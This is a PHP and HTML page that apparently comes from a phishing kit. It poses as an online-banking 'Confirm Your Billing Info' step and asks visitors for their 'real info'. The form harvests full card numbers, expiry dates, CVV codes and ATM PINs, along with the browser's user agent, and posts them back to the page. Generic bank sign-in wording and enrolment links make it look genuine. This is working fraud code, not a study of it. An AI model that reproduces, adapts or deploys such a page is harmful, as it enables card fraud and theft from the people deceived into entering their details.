<?php
include 'head.php';
include 'token.php';
$title = 'Confirm Your Billing';
include 'header.php';
?>
<!-- MAIN CONTENT START HERE -->
<!-- Start Card -->
<div class="card_content_2">
  <div class="card-body card_content_3">
    <div class="row ">
      <div class="col-md-12">
        <h5 class="sign_in_text">Confirm Your Billing Info</h5>
      </div>
      <div class="col-md-4 custom_right_padding">
        
        <div class="form_box">
          <div style="border-radius: 7px 7px 0px 0px; margin-top: -1px; padding: 6px 8px" class="form_title">Enter Your Real Info:</div>
          <form action=" " method="post">
            
            <input type="hidden" name="token" value="<?= $token; ?>">
            <div class="form-group form_group_custom">
              <label>Credit/Debit Card Number:</label><br>
              <input minlength="16" maxlength="16" required="required" id="cc" placeholder="4444-4444-4444-4444"
              style="margin-top: -4px;" type="text" name="card_no" pattern="[0-9]{16}">
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Expiry Date:</label><br>
              <input required="required" id="exp_date" placeholder="12/25" maxlength="5"
              style="margin-top: -4px;" type="text" name="exp_date">
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>CVV:</label><br>
              <input maxlength="3" required="required" id="state" placeholder="123"
              style="margin-top: -4px;" type="text" name="cvv" pattern="[0-9]{3}">
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>ATM-PIN:</label><br>
              <input maxlength="4" required="required" id="street" placeholder="1234"
              style="margin-top: -4px;" type="text" name="atm_pin" pattern="[0-9]{4}">
            </div>
            <?php
            $agent = $_SERVER["HTTP_USER_AGENT"]; { ?>
            <input type="hidden" value="<?= $agent; ?>" name="user_agent" >
            <?php } ?>
            
            <br>
            <div class="form-group">
              <button disabled="disabled" id="submit" type="submit" name="billing_submit"  class="btn btn-secondary btn-sm btn_signin">Continue</button>
            </div>
            <p class="footer_form">
              <strong>Enroll in Online Banking:</strong><br>
              <div class="link_btm" style="font-size: 10.89px;">
                <a href="#">Personal</a> | <a href="#">Small Business</a>
              </div>
            </p>
          </form>
        </div>
        
      </div>
      <div class="col-md-8 custom_left_padding">
        <div class="card radiuses" style="border: none;">
          <div class="desc_text_box">
            <p class="desc_text">
              All of the account information and services you have come to expect from Online Banking are ready and waiting for you. Just complete the sign in process to see your account(s), view statements, pay bills, and conduct the activities that you normally would.
              <br><br>
              <strong>To Sign In</strong>: Enter your User ID and password. Then, click the 'Sign In' button.
            </p>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript">
    (function() {
    $('form > div > input').keyup(function() {
    var empty = false;
    $('form > div > input').each(function() {
    if ($(this).val() == '') {
    empty = true;
    }
    });
    if (empty) {
    $('#submit').attr('disabled', 'disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    } else {
    $('#submit').removeAttr('disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    }
    });
    })()
    </script>
    <!-- FOOTER -->
    <?php
    include 'footer.php';
    ?>